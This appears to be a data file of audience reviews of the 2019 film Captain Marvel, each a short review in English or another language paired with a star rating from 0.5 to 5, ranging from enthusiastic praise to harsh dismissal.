"People who don't like this movie show a small valid point, it can be a little bland at times but the overall story is amazing. I feel people expecting way too much of this film without actually understanding a character and why they would act a certain way. It has a lot of ""Marvel humor"" which I personally love, but if you don't like that kind of humor you won't be as much of a fan of the film. It is very female forward. The plot revolves around self-discovery in a way about Captain Marvel/Carol Danvers finding out who she is after gaining her powers, I also think the villain of the story is well written and the final sequence aka the ""last battle"" scene was really well done. I've seen a lot of people criticize the final battle scene as being anticlimactic and I feel those people fail to see why it was written the was that it is. It's not in the top 10 best Marvel films of all time, but as their first female centered movie, they do a really good job.",4
"It rises to the occasion with strong performances and with its directors' willingness to slow down and take their story seriously, balancing humor, action, and exposition in a carefully calibrated package.",4
Fun movie with action and humor. One of the better first movies from marvel.,4
"Terrible. She had no character and no personality, her powers are lame, her outfit is lame, her look is lame, there is nothing unique about her. The whole movie was a boring cgi filled nothing. BORING.",0.5
"Although Samuel Jackson, Ben Mendelsohn, and Jude Law all did exceptional, the rest of the film was‚Ä¶ fine. Brie Larson was okay and the script was a little much. This was definitely not the MCU at its best.",3
Es gran pel√≠cula de superh√©roes y buena nick Fury me encanta y tambi√©n capitana Marvel es carism√°tica los efectos son buenos bien hecho Marvel,3.5
Not great but not terrible. The de-aging CGI on Fury as well as Goose the Flerken were the main highlights. Mediocre overall.,3
"I can't tell you how excited I got when captain marvels badge appeared on the pager. It was a beacon of hope after the dystopian ending in Infinity war. Then I watched this movie... They took a wonderful character, amazing actress and somehow shoehorned them into a lifeless bland movie with no heart at all. The worst thing is not only did they waste a great actress and character they diminished some of their established and loved characters in the process.",0.5
"It was not fantastic, but not a 40-ish% bad. I just had issues with the era this was in and the fact that it was all about a race I knew little to nothing about vs grounded in the MCU characters I am more familiar with.",3.5
Disappointing. One of the earliest signs of the decaying Marvel franchise.,0.5
I thoroughly enjoyed this movie! I knocked down a half star as the beginning was a tad slow but mostly because I wish Brie Larson had more lines!!! But overall this will definitely join in the rotation of Marvel comfort films. This is an action packed GIRL POWER MOVIE that is perfect for the 90s time period and can show little girls of today what they can do and accomplish! I regret not seeing it sooner as I had let the reviews of others persuade me. And I hate that the misogynistic people of the critics' world (and general audience viewers) made me think anything less!,4.5
"How to bring to the big screen a character that most already know and that is extremely powerful? I was pleasantly surprised, most of the movie is not about blasting things up. Would have liked to have her evolve more from her early days into a superhero. Some storytelling details that could have been less forced. But Ben Mendelsohn is great, especially early in the movie.",4
In order for this movie to work you have to like the main character and pull for her to become a hero But the character presented here just comes across as arrogant from start to finish The special effects arnt exciting or engaging and the plot is don pop ain't by numbers it's boring There's a nice use of playing around with the b marvel timeline but by the films end you have a superhero who's biggest power is how to annoy everyone in the audience A hero needs to be humble and graceful If not then they just feel like a overpowered problem Wonder Woman did this story with class but this is just a terrible knock off That you can't remember as soon as you leave the theatre,1.5
"Another in the category of ""I disagree with the audience score"", although with this one it's obvious on account of the right wing incel crowd negative review bombing it because 1) it has a woman as the main protagonist, and 2) that woman has dared to speak up about sexism. It's not the perfect movie, but it is a fun watch, it does have a reasonable story, and I am currently watching the whole MCU through in timeline order (having only seen about 25%, maybe a third, of all the insanely numerous titles there are now previously), and seeing the ways in which it ties in with the larger MCU story as I know it so far is a lot of fun.",4
"This was very mediocre. Nick Fury was great, and the Skrulls were a very welcome addition, but it seems like Marvel doesn't know what they want to do with Captain Marvel. One minute she's getting her butt kicked in hand to hand combat, the next she's destroying space ships with ease. I don't understand what they were trying to do with her.",2
"It rises to the occasion with strong performances and with its directors' willingness to slow down and take their story seriously, balancing humor, action, and exposition in a carefully calibrated package.",4
It's not amazing nevertheless a fun movie.,3
"The movie just dumps on tradition and history of the MCU. Nick Fury's eye injury, the Tesseract in a lunchbox, the silly nerf gun prank. Worst Infinity Saga movie.",0.5
"Everyone knows that about 1/2 of the audience reviews are without merit because they're full of incels who are upset that Marvel gave a woman a lead superhero movie. The truth is, this is one of the BEST origin story films from the MCU. We get a young Fury (pre-director of shield), a young Phillip Coulson, a very young Monica R (who is in WandaVision and 2023's The Marvels), and we also get the moment that Fury has the idea for the The Avengers. the amount of CANON awesomeness in this movie makes it loads of fun. Bri Larson is an Oscar winning actress, this film departs from her usual serious drama acting and sometimes you feel that, but ultimately we do root for her character and we do sympathize with her and she does a great job at embodying just how powerful CM is. The underlying ""girl power"" theme meant the world to me when I saw it in theaters and 4 years later, whenever I see it again (about 3-4 times), I still cry during the beginning of the climax when every version of her throughout time stands up after getting knocked down. Inspiring, fun, a great MCU experience. Better than some of the most recent films for sure.",4
"Is fun movie, and brie larson is incredible with captain marvel",5
One of the worst movie in MCU since Incredible Hulk. Flat screen writing and worst characterisation made me bore. Except the first half an hour the whole movie was too bad.,1.5
OK movie . One time watchable for its lead to Endgame.,2.5
I don't understand the negative reviews. This can't possibly be accurate for a movie that made over a billion dollars at the box office! It is fun and exciting!,5
"I feel as if this is part of the new age of ""The 1st movie is only setup"", as it was a tad slow.",3.5
"Not saying it did not have some positive factors (Music, Goose the cat) but all in all noy a good MCU movie. Larson is not convincing, the dialouges are forced. Loads of uncalled for toxicity against Nick Fury, an element that repeated every 5 minutes. Honestly? It made Ms. Marvel not critical for MCU arc.",2.5
Captain Marvel hat keinen Charakter und ist einfach nur perfekt. Es ist nie spannend und die Story ist mittelm√§√üig bist schlecht,1.5
"The movie isn't as bad as some say, but it does feel like a bit of a drag to watch.",3
"To be honest, this movie wasn't as bad as many said it was. True, I'd rather watch another marvel film because this film is slow, but still ‚Äî compared some of the other newer films, this one is better.",3
"Personagem n√£o atrai o p√∫blico. Lhe falta carisma! Apesar de tentar empoderar, erraram de forma grotesca.",0.5
"I honestly think the majority of negative reviews come from incels who hate seeing a powerful woman, and given all that was said online I feel pretty justified saying that. It's a GREAT film with a great cast, lots of funny moments and a great storyline. Plus after years of them treating Black Widow like eye candy for the Avengers it's nice to have a female empowerment film. If you don't hate women because one wouldn't date you then you'll love it.",5
"This movie was MCU standard. It definitely would've fair better if it came out in phases 1 or 2. Love the scenes where Carroll & Nick Fury were acting like buddy cops. However, the villain was forgettable, They didn't do OG Mar-Vel justice, & haphazardly sets up the Kree & Skrulls conflict. With that being said, this movie was over-hated & often use in bad faith arguments to justify so called ""criticism"" of female representation. I hope the sequel fairs better.",3
"It is one of the worst movies I watched made by Marvel. Boring, irrational, condescending and completely unlikable main character, who looks sometimes more like the villain of the movie",0.5
I liked this movie. It was a solid entry in MCU. The flerken scratch was an amusing way for Fury to lose his eye. Comic purists need to lighten up.,3.5
Just a poor movie in comparison to most of the earlier Marvel productions.,1
"Captain Marvel is not a good movie. The casting was off, the villain was one-note, the plot was confusing and I had no vested interest in the final outcome. Just like ""Vers"" I was completely lost between the Kree, the Skrulls and a mutant cat named Goose. I like Brie Larson in other films, but she was completely miscast in this role. Carol Danvers was described as having too much emotion, however, Brie Larson did not show any range of emotion in this film. Any feeling that was expressed seemed forced and rigid. I got so bored watching Captain Marvel that I stopped and watched Paul Blart: Mall Cop to wake up before finishing. Not even a crash into a Blockbuster and a fight with a granny could save this film. Honestly, it's a good thing that this movie is smack between Infinity War and Endgame otherwise my faith in the MCU might have been lost.",1.5
This is an over hated movie. Wouldn't say its great but its a ok movie.,3
Hahaha tha horrible thing cant be called a movie!,0.5
"Cosmic Karen with a brick of cheese for a face skulks around until she decide to ""believe in herself"". Sphynctal cringe: Deeper, Harder, Puckery-er.",0.5
"Captain Marvel was an interesting move for marvel. They were originally planning on releasing the next avengers movie, but the Stan Lee, the owner of marvel, tragically passed away. So in honor of him, they made the movie dedicated to him about Captain Marvel, the most powerful hero in the MCU.",2
"Felt very monotone, didn't care for the movie overrall.",0.5
"This movie wouldn't have suffered so badly if it didn't come out between Infinity War and Endgame. I have seen it four times since it came out and I keep hoping that it will get better with each watch but that isn't the case. Overall, it is an okay movie and not the worst outing in the MCU. I only couldn't connect with Captain Marvel as a character.",3
Captain Marvel is boring and kinda dumb.,2.5
This movie was boring I even forget the plot even when I am watching it,1
One of my fav stand alone Marvels.,4
Boring and average. Such a shame. One of the greatest marvel characters reduced to star trek knockoff.,3
"Captain Marvel finally gives young girls and women a powerful archetype in the MCU for the woman as hero who overcomes the obstacles that the universe puts in her way to control her and keep her in bondage. Carol's whole story is based on identifying, processing, and breaking free of the gaslighting and controls placed on her by those who have exploited her and her power for imperialism and the oppression of others. It's also just a ton of fun with great 90s references and music. Carol and Fury have great chemistry as buddy cops seeking to uncover the truth and protect people from the schemes of others. Great fights, great action, and a great story. Brie Larson is amazing in this role.",5
Ok movie where she fights aliens and humans. They could have made more sense of the story. Captain Marvel was a man back then not a woman too.,3
"It not a bad film, it just that the underdog scenes remind me of First Avenger and the script wasn't good . Brie is not bad as Danvers. The character not having emotion, work for the character because of the indoctrination by the Kree.",2.5
"Captain Marvel is a really cool movie that tells us the story of Carol Denvers in a fresh and quirky way compared to other Marvel movies. Brie Larson is a perfect choice for portraying her, I couldn't think of anyone else! Plus, the chemistry between her and Samuel L. Jackson is really good, since they're great friends IRL, and capable of delivering lots of unforgettable funny moments. Another thing that makes this movie special for me is the amazing Stan Lee tribute in the Marvel intro and cameo, which I gotta say its my favourite one: a simple, yet powerful heartwarming exchange of genuine smiles between Stan and Brie. Thank you Stan, for everything. Don't let anyone fool you! You might have heard bad things about the movie, the character or even the actress herself, I'm just going to say: watch it and judge for yourself, I'm sure it's going to be worth your while.",4
"Pel√≠cula s√∫per aburrida, sin sentido alguno. Pura pantalla para vender.",1
"filme ruim, atris sem carisma, roteiro fraco sem gra√ßa...",0.5
"Bad acting, bad casting, bad storyline, no struggles, no emotions, killed the whole story behind the ""Last Time I Trusted Someone, I Lost An Eye"" - Captain America: The Winter Soldier (2014). I didn't even finish the movie in 1 time. I had to pause it 3 times because I was so bored and annoyed. Sam Jackson deserved better. Garbage movie.",0.5
"I don't get the hate for this film, yeah it was a little boring but overall it was a solid film",4.5
This movie is amazing. It's the most fun Marvel movie I've ever seen. No shoehorned in romance. No overly sexualized female superhero.,5
Probably one of the worst if not the worst MCU movie in the 30+ movies they have made,1.5
"Not bad as everyone said about it, it's fun and have quite the story. Love to see a younger Coulson & Fury. Love the glowing powers of Carol.",4
"This movie has flashbacks that should have (IMHO) been in the beginning to build up a connection with the characters instead of the order it was laid out. Also the political refugees are best, those that are against them are evil message took off 2 stars.",2
Absolutely loved this movie. Brie was great in it. Incels & YouTube liars who ran a hate campaign in 2019 even before this movie was released to review bomb and tank the audience review can go eat grass. Kudos to Rotten Tomatoes for changing the audience review process after this! üëèüëè,5
"Love love love love, beautiful work",5
"This is a movie that I don't watch all that often, but when I do, I like it more and more. Someone mentioned it on Reddit the other day and we discussed it's merits in the chat, and then I spent the afternoon rewatching it. It's a fun damn movie. And clever, too. I love the lore that it sets up and it was smart of Marvel to clear our palettes after Infinity War, to introduce Carol Danvers, and then watch her do her stuff in Endgame. I truly enjoy this movie.",5
Boring. Not much more I can say about it other than the plot couldn't be saved by Brie Larson's stilted bored acting.,1
Love it! Carol is a bad a** and she makes the insecure men on Twitter so mad so her impact is really unmatched ‚ù§Ô∏è‚ù§Ô∏è,5
"If you are a fan of the source material and canon - you will find this movie truly horrible. If you are not a Marvel fan, you will also find this film horrible. It is not entertaining. I am a decades long Marvel fan, and enjoyed most of the Marvel movies prior to this.",0.5
"I watched it a little later than I should have, but I really enjoyed it. I liked the theme and the action. I hope they put Captain Marvel in more movies.",5
The CGI is great but the plot is cliche,3.5
Rubbish. It seemed like a rushed movie to introduce a new character before avengers end game.,0.5
Like it was actually not as god awful but it is still bad :),1.5
"Se arrependimento matasse, eu assisti esse filme no cinema, e tenho trauma at√© hoje de ter pago para assistir ele. Eu tive interesse nele por conta dos vingadores, e foi uma tremenda decep√ß√£o, eu queria poder voltar no tempo para me avisar, para n√£o ir assistir esse filme. Marvel me decepsionou nessa",1
"While the movie had some decent action scenes and special effects, overall I found it to be underwhelming. The story lacked depth and failed to keep me engaged, and the characters didn't have enough development to make me care about their fates. Additionally, the humor fell flat in many places, and the pacing felt off, with some scenes dragging on too long while others seemed rushed. Overall, I was disappointed with this movie, and while it may appeal to some fans of the superhero genre, it didn't meet my expectations",1.5
Awful movie! Samuel L. Jackson needed his own movie instead of this crap.,0.5
"Captain Marvel is one of the films in this cinematic universe that falls flat. Generic and uninteresting, the good visuals and acting don't save it. Rating: 37%",2
The User score got review bombed by mad MAGA‚Äôs. This is a good movie.,3.5
It had good pieces but I've never seen a movie Brie Larson was good in. Different lead actress and this would have been better.,3
"Such a good movie, love the audio and visual effects. Great pick of colors and background music.",5
I basically want to be Carol Danvers.,5
"Captain Marvel is an extraterrestrial Kree warrior who finds herself caught in the middle of an intergalactic battle between her people and the Skrulls. Living on Earth in 1995, she keeps having recurring memories of another life as U.S. Air Force pilot Carol Danvers. With help from Nick Fury, Captain Marvel tries to uncover the secrets of her past while harnessing her special superpowers to end the war with the evil Skrulls The reveiw: Captain Marvel should only be watch if you are watching the whole MCU or your going to watch endgame.The plot is mid and the fight scenes are flat ot terrible. The best part of it though is the introduction of young nick fury and the tesseract. This later help set the plot for Secret Invasions. the acting and cinematography were okay, while the CGI was good enough.",2.5
"By far worst Marvel movie. Acting was horrible, and main character was the wrong choice for this movie. Would have liked to of seen a better actress and story line.",1
"una pel√≠cula que en realidad no muestra a su hero√≠na en un riesgo real algo que le hace perder emoci√≥n al filme ,simple pero disfrutable ,guion sencillo .efectos y cgi muy buenos pero personajes poco entra√±ables",3
"Esta pel√≠cula introduce a la que supuestamente es la m√°s poderosa de los h√©roes de Marvel y es evidente por el nombre. La idea de esta pel√≠cula es buena, pero la forma en que fue materializada dejo cosas que desear. Para empezar, la historia de origen de Carol Danvers est√° buena, los efectos especiales y las escenas de acci√≥n hacen lo de siempre haciendo que la pel√≠cula logre ser entretenida. Lo malo es que tiene una historia muy simple y gen√©rica que pod√≠a haber sido aprovechada al m√°ximo debido a algunos puntos interesantes que ten√≠a. Samuel L. Jackson es buen actor que nos presenta a√∫n Nick Fury antes de ser el Nick Fury visto en las dem√°s pel√≠culas. Aqu√≠ es un alivio c√≥mico que da gracia y eso puede decepcionar a quienes ya lo conocen. A Brie Larson le queda bien el personaje de Carol Danvers en cuanto la facha, pero su personaje es demasiado gen√©rico y plano. Carol no tiene mucha personalidad y eso la hace un personaje dif√≠cil de empatizar. En conclusi√≥n, Captain Marvel es una pel√≠cula que logra entretener como las dem√°s entregas del MCU, pero pudo haber sido mucho mejor. Mi calificaci√≥n para esta pel√≠cula es un 7/10.",3.5
I'm surprised by these ratings. I really loved this movie.,5
I don't think I could dislike this movie more,0.5
Awful film. Bs honestly thought Brei was sexy back in the day and now from seeing how she is via social media ect I think she's a horrible person.,0.5
Brilliant film. Watch it 3 times in the last 1 year and I believe they did a good job making this,4
"I watched this atrocity with low expectations. I was not disappointed. Brie Larsen is a cardboard cutout, delivering lines with the skill of a high school thespian, completely unconvincing and unlikeable in her hero superhero role. She has none of the athleticism or charisma you'd expect. The plot is a garbled mishmash of cheap special effects and tedious fight scenes. I couldn't finish this embarrassment. I was already weary of superhero flicks; Captain Marvel hastened the process.",1
"I cannot tell you how badly I wanted to love this movie! I had no preconceptions regarding any of the actors in this film, I was just so looking forward to another great MCU movie. The first time I watched it I was so shocked at the horrible acting - specifically - the poor delivery by Brie larson. It was not just that she was flat and uninspiring - she was actually annoying on screen and it distracted from the entire film for me. Only after I had watched this film, I read up about Brie Larson and was made aware of all of the controversy surrounding the actress herself. (I am disabled and my physical limitations often leave me living in a very small type of world - So I was not exposed to anything beyond the films and the MCU or other films I choose to watch) .... To because I wanted to love or at least like this movie so much ... And in anticipation of the next MCU avengers movie ... I decided to watch it a second time, thinking that if I watched it while I was in less physical pain and a better frame of mind then the first time I watched it, that I could enjoy it. But it was painful to watch the second time - even more so than the first time. The script is not terrific, but because I really just love the MCU, I could have gotten past that - but I could not get past the absolute dislike of Brie Larson's performance. I could not find a way to like the character ... Now that I'm re-watching some of the MCU movies while recovering from another medical procedure, all I can say is that I am happy that this movie is not important to watch and somehow seem so disconnected from the rest of the MCU that I can just pretend it does not exist. The biggest disappointment is how much potential this movie could have and should have had. More than a missed opportunity - a complete train wreck for lack of a better term. Save yourself some money and pass on this film and even if you're not paying to watch it, there's got to be a million things to do with two hours then watch this movie. This is the harshest review I've ever given and felt compelled to voice my disappointment and frustration with how bad this movie is.",1
It's not my favorite but I actually liked the the movie. I came here after watching Ant Man Quantumania and I can't wrap my mind around how that has an 80%+ audience score but this one was trashed. People need to rate objectively and put aside their political agendas,3.5
"Let me start by saying that this film is a mixed bag. On the one hand, it has some strong performances, impressive visuals, and exciting action sequences. On the other hand, it suffers from some pacing issues, a lack of character development, and an overall lack of originality. The plot follows Carol Danvers, played by Brie Larson, a former U.S. Air Force pilot who becomes the powerful superhero, Captain Marvel. Along the way, she discovers secrets about her past and teams up with a young Nick Fury, played by Samuel L. Jackson, to stop an alien invasion. One of the film's strengths is its portrayal of Carol Danvers, Brie Larson delivers a solid performance as the titular hero, and her chemistry with Samuel L. Jackson is one of the highlights of the film. The action sequences are also well-done, with some impressive CGI and choreography. However, the film suffers from a lack of character development, particularly with regards to the supporting cast. Many of the characters feel underdeveloped and one-dimensional, and their motivations are often unclear. Additionally, the film's pacing feels off at times, with certain scenes feeling rushed or unnecessary. Another issue with the film is its lack of originality. It follows many of the same beats as other superhero films, and its storyline and themes feel familiar and predictable. Overall, Captain Marvel is a decent superhero movie that has its moments of entertainment. However, it falls short of being a truly great film due to its lack of originality and underdeveloped characters. If you're a fan of the Marvel Cinematic Universe, then you'll likely enjoy it, but don't expect it to break any new ground.",3.5
it is not really worth buying,2.5
"In this ruckus romp, Kyrsten Sinema plays Captain Marvel the sassy blonde don't say boo to me super hero that's too busy on her phone right now to acknowledge what the other super heroes are talking about. But who needs to worry about Avenger drama when you're living your best life? Not this girl with her no fucks given necklace from Etsy. Two thumbs up... a stinky asshole.",1
They ruined the Marvel character Mar-Vell. And I think Ronin should have had a bigger part in the movie.,3.5
"When everything about your film is good except the main character, there is a MAJOR problem. Carol Danvers is unlikeable, stale, and not funny. While I really like the story and the Kree/Skrull war, young Nick Fury is a blast, and the 90's theme is inherently retro and tubular, it does not forgive the performance of the lead.",3
Not that great and certainly not the way to handle a character of this nature.,2
Dont understand all the hate. I really enjoyed the movie. The final scene could have been a bit longer but that's it. Good movie.,4.5
"horrible movie, horrible acting, horrible sound quality. nothing at all to like about this.",1
n√£o gostei do filme podia ter uma ideia melhor para adquirir o poder ou apresentalo de forma diferente,1
Solid and gets better with more viewings.,3.5
"""Captain Marvel"" is a 2019 action/sci-fi film directed by Anna Boden and Ryan Fleck and starring Brie Larson as the titular character. The movie is set in the 1990s and follows Carol Danvers, a Kree warrior who discovers her true identity and learns to harness her powers in a fight against the shape-shifting Skrulls. One of the strongest aspects of the movie is Brie Larson's performance as Carol Danvers. She brings a sense of depth and complexity to the character, making her more than just a typical superhero. The supporting cast is also strong, with standout performances from Samuel L. Jackson as Nick Fury and Ben Mendelsohn as Talos, the leader of the Skrulls. The film's visuals are also impressive. The action scenes are well-choreographed and exciting, with the use of CGI blending seamlessly with the live-action footage. The cinematography by Ben Davis is striking, with a mix of high-contrast lighting and wide shots that help to emphasize the scale of the action. However, the film does have some weaknesses. The plot can feel convoluted at times, with a lot of exposition needed to set up the world and characters. Additionally, the film's use of '90s nostalgia can feel forced, with some references feeling more like product placement than organic storytelling. The film's musical score by Pinar Toprak is solid, but not particularly memorable. The direction by Boden and Fleck is competent, but the film's pacing can feel uneven, particularly in the first act. Overall, ""Captain Marvel"" is an entertaining and visually stunning action/sci-fi film with a standout performance from Brie Larson. While it may not be the most original or tightly-plotted movie in the Marvel Cinematic Universe, it is a worthy addition to the franchise and a welcome introduction to the character of Captain Marvel.",3
"It's just really boring, the effects are nice though",3
"I think the narrative structure of this film turns a lot of people off to it, but there's a lot of heart in this film, someone being told they can't and they overcome people's expectations and then some.",4
incr√≠vel!!! um dos meus favoritos da marvel.,5
"I understand why people don't like Brie Larson, but the movie isn't that bad. It's not that good either. Tbh, it's not really essential to watch. You could literally skip this movie and you wouldn't miss much. Just remember there's Skrulls and a cat scarred nick fury's face.",2.5
"Ni siquiera los regulares efectos visuales salvan a esta catastr√≥fica pel√≠cula se salvarse. Plana, aburrida y sin identidad, estamos ante uno de los proyectos de m√°s baja calidad dentro del MCU. Larson como Carol Danvers no puede ser menos expresiva y carism√°tica.",1.5
"After a 5 and a half year streak of good movies from the MCU, this one is just really mediocre.",3
I loved everything about it,5
it was okay not the best but defo not the worst,3.5
"People like to count this movie out, but this was a great origin story",3.5
All of the grace and good acting possessed by a plank of wood plus a deeply flawed plot make for a terrible movie.,1
Brie Larson is pretty good in the role I think she could've been more likable but the movie is very strange as it kind of feels like it there's a lot of things going against it with a not really good finale and she's too powerful and is never met with a match but a pretty fun movie with some pretty good sequences 5/10,2.5
"Captain Marvel is not a horrible film, but Captain Marvel is definitely one of those films that you're not really looking forward to re-watching. It just seems very bland to the MCU and it doesn't feel like it's connected. I think that Bree Larson could do a better job, if she wanted to, I really feel like the film has all the aspects and capability of being great. But I just feel like Captain Marvel has never been done correctly. And I don't know if she ever will be, I'm very nervous about the sequel, but we will see you later on this year.",2
"Bad acting, terrible writing, not entertaining. Everything wrong with modern super hero movies.",0.5
"My problem with this film is that Carol had no growth , it was just some events that happened and the no emotions thing is a bit of a stretch but there was still very few emotional moments that made me shed a tear or made me smile although I did smile when it was over. My overall thought on is this not- wanted film is it had so much potential but then ended up a Disney cash grab.",1
Yet another super hero transitioned into a an over entitled woman with no extraordinary characteristics other than being a woman. Don't bother watching.,0.5
"Not a bad film at all, it just had a lot more potential if some things were tweaked. There is a flashback sequence of Carol being discriminated against for being a girl. One of the scenes is her ignoring her dad's warnings and then getting yelled at for ignoring him and crashing her go-kart. She gives the camera this look that says ""I'm getting yelled at cause I'm a girl"", and I unironically laugh so hard at this. No, you're being yelled at because you ignored your dad and could've hurt yourself. I love that scene so much.",3
Lame in so many ways.,0.5
it was good but should've come sooner in the MCU,4
"It's a little disjointed, but the setting and secondary characters help propel it to better than average.",3
"La definici√≥n de c√≥mo no hacer una pel√≠cula, de origen de una superheroina, y sobre todo su mediocre ""empoderamiento"" femenino y desperdicio de personajes, entre muchas otras cosas, en resumen una mala pel√≠cula",1
Captain Brick on its crusade to save the universe. Not a good movie and not a good Marvel movie. There are reasons why the hero of this flick gets sidelined with the sequel 'Marvels' (whoever will care about that one).,0.5
"Do not watch, no charakter development, hates all man it seems",0.5
"I remember I disliked this movie, but don't have energy to re-watch it again and write all of my pain points. The one thing you need to know. YOU WILL BE DISAPPOINTED.",1
I've given this review two stars and that's purely for the visuals. Brie Larson is as lifeless and compelling as a brick. With a superhero what makes them iconic is they have weaknesses and they show moments of pure raw emotion. There is absolutely nothing likeable about Larson's portrayal as Captain America. Visuals as mentioned are great and was the only thing that kept me turning this movie off.,2
"This movie is a good mix of humor, action, and story. I loved getting to know Captain Marvel and her story.",5
Brie Larson should stick to playing evil and mean characters. It comes to her naurally xD. The movie was one of the worst MCU one ever!,0.5
One of the top 3 contenders for worst marvel film to date.,1
"not terrible, but not much reason to watch it again. solid, middle-of-the-road marvel film which makes it all the more disappointing because it could've been so much more.",3
"Samuel L Jackson is the best part of this film, the de-aging of him and Coulson is cool to see. Jude Law gives a good performance too. While Brie Larson gets a bad reputation, she's decent in this film. The film has some good moments and is funny at times. The ""girl power"" moments are pretty cringey and the story is abit weak. It's definitely not going to be in the top 15 of Marvel movies but it's definitely not the worst. It was critiqued harshly back in 2019 but compared to the phase 4 Marvel films that have come out since, it holds up well enough and is worth watching during a MCU binge.",3
An average and unnecessary Marvel movie with an arrogant main character that lacks any charisma and has unoriginal powers.,2.5
"Disliked it. Useless character, not needed in Marvel universe.",0.5
Good movie. Nice action scenes and plot. The twist at the ending is nice also,4.5
"I loved all of the references to the 90s. I love origin stories and felt this was pretty good. I was left with questions about the plot, but the cast made this enjoyable. Hidden references to other characters and tying movies together is what I love the most about the franchise. It is a movie that I've watched several times and will watch again in the future.",4
"Not worth a movie, the character is not well developed, the acting is mediocre and the effects are not great either. Only the story is acceptable and make it less of a pain to watch.",0.5
The writing is the true villain of this story. They go in trying to be a strong feminist film when they make the female lead into a boring and overpowered hero. Too many 90s references and pandering to the audience get annoying over time. Brie Larson's mostly stale acting hurts the film as well when she is surrounded by such amazing talent such as Samuel L. Jackson and Ben Mendelsohn. A disappointing entry for the MCU leading into Endgame.,1.5
"The marvel formula was pretty tired at This point, but Atleast they had some flaws/setbacks, captain marvel had none of this and also the actress was insufferable just to top it off.",0.5
"She's just so obnoxious, as a character that I ended up rooting for the other side. A raging narcissist who assaults people randomly is not a hero.",0.5
"I had to recently re-watch this to really get my head wrapped around the movie. I think for me the first time I couldn't really say anything because the movie was so wooden and predictable. There were times where the movie was just so cheesy, for example when they show brie larson dancing and singing in a flashback, it felt extremely forced and cheesy I just couldn't buy the scene. It felt like Brie was trying just way too hard to be silly and goofy, now that I've seen how she conducts herself in real life it makes sense, because she is actually very stern and non-humorous so the parts where they try to make her a likable hangout friend it doesn't work because she isn't that and can't pull it off in a scene. Overall the movie had some great introductions to characters like the skrulls, but if I'm to be honest it was more of a redbox film as long as nothing else looked better that weekend.",2.5
"Refreshing new character and great cast, but the story dragged",2.5
"I avoided seeing this one when it came out because of all the drama surrounding it, but I had the flu so I finally got caught up on some gaps in my MCU viewing. It was about as bad as they said it was. Brie Larsen just has little to no charisma and gave a wooden performance. Her character was too emotional in her actions (as several characters rightly pointed out), but showed far too little emotion in her facial expressions. She kept trying to deliver cheeky quips but they all fell flat. Overall, it was still an entertaining movie but it was the secondary characters that carried it along.",2
Started out Solid and just slowly went down. Was Disappointed. The acting is ok overall. Brie Larson just never became charming like Iron Man or had the stoic presence of Captain America. Instead she just was boring and ok. This for me was the biggest problem she just never had any chemistry with any of the other cast who turned in ok to good performances. The closest was with Jackson but even that was hit or miss most of the time. And in a origin story film about this character that is a major problem. The expose got way too much in the middle of the film also. The cinematography is alright. The ending gets ridiculous and way too over the top along with some uninspired Sci-Fi settings. The desert is forgetful. The music is not that good which surprised me mainly because the generic superhero score is fine but their are some weird pop songs in this that just don't work. Very odd choices that just don't mix well. The editing is above average but it felt like the film had too much too it almost in terms of ideas and as the film kept going it just started to drag. This leads to a subpar pacing that by the last 20 minutes I just wanted it to end because I was just getting bored. The special effects are just ok. there is way too much CGI and nothing really pops in this. The effects on Jackson though were good I have to say. Overall it was just ok. But I can't really recommend this to anyone outside of Jackson fans for his solid performance. Everything else is forgettable and not worth the investment.,3
Bri Larson wooden and boring. She's got talent and she was good in some of her early work. She just doesn't have enough chops to add life to a poorly written character. Her character is not interesting because she's got no flaws or character arch to speak of. Samuel L. Jackson was fun but couldn't carry this movie.,0.5
Not good at all. Brie Larson is not enjoyable to watch.,0.5
"I'm generally a big fan of all the Marvel movies however, my son warned me about this one. He said, ""don't bother, she is a terrible actress."" The only redeeming value of the movie was Samuel Jackson (he is always good). Brie larson's acting ability is akin to watching paint dry on a wall. She looks somewhere between bored and pissed of nearly the entire movie. Well, that's two hours+ of my life that I will never get back.",0.5
"Honestly, the story of Mar-Vell and all the awesomeness leading to Ms Marvel and the overall story‚Ä¶.why change it? The stories were loved for a reason, stay closer to the source material and you will find a winner. People don't just remember these tales for nostalgia, these stick because they are GREAT stories.",1.5
"It's not a perfect movie but it's fun. Talos is cool. Nick Fury is cool. Agent Coulson, obviously, is the coolest character in the MCU, so it's great fun to see him again. Lashana Lynch as Maria Rambeau is terrific.",3.5
Complete waste of time if you want to see an actual good movie. Just go watch Aqua man its way more worth your time. Never been that bored for 2 hours and 4 minutes.,0.5
Literally cannot remember one thing that happened in this movie. Very forgettable.,0.5
"I didn't have fun watching the movie, I went to the cinema just because it was between Avengers Infinity War and Avengers End Game",0.5
"I would rate this higher because Sam and nostalgia of the 90's saved it but, its just not good.",0.5
"Boring and terrible writting, please don¬¥t watch it if you like superheroes movies, this is a carnival of mistakes.",1
"From the 90s looking sci-fi in the first act to shallow characters, story and message, it's all a huge mess. Don't waste your time with this movie.",1
"Meh. It's fine. Solid mid-tier Marvel film. All of the positive and negative hype around it is hyperbole. Personally, I believe that there's actually was potential for a really good film here but you can just feel the Disney corporates dialing down the interesting elements and forcing it to stick to safe formulas. So, in that way, it's disappointing. The acting is okay. The visuals are competent. The 80s callbacks and cat are fun.",3
not as bad as people make it seem but it's quite forgettable.,3
"I love this movie sooooo freaking much! It is the best Marvel movie in the world. In fact thanks to Captain Marvel the movie has given me a second chance to rethink and like all superhero movies across Hollywood. I really like Carol Danvers she is my number 1 favourite superhero of all time. Because she really different from most superheroes. She wear my favourite colours red and gold, she's extremely powerful and she freaks GLOWS!!! OMG!!!, she doesn't wear a Cape behind her back which means she been listening to Edna mode advice lol. And even those lot of people say she has no emotions I think your all wrong we literally see her cry at the end were the supreme intelligence captured her and she was remembering her childhood, and how she stepped up when things got difficult for her. We've seen her laugh multiple times and smile. There is honestly so much positive things to say about this movie and only positive thing. So I would like to say Thank you to Brie Larson, Marvel studios and everyone who work really hard on this movie. It really did deserve billions of dollars and nothing more but positivity and success. I can't wait to see more of Captain Marvel in The Marvels and in future movies/shows. Keep up the great work.",5
"At just over 2 hours, this straight forward origin story is pretty standard, but overall it was satisfying, it felt shorter than it's runtime, due to a steady & consistent flow.",3.5
"Bien aburrida la trama, lo unico recatable es Goose",1.5
Very underrated movie. It's good fun and a joy to watch.,4.5
Probably the most formulaic marvel movie of all time. Not bad by any measure but nothing to rave about. It had it's fun moments where it was good but would suddenly turn around to disrespect and/or misrepresent important characters like Fury and Mar-Vell.,3
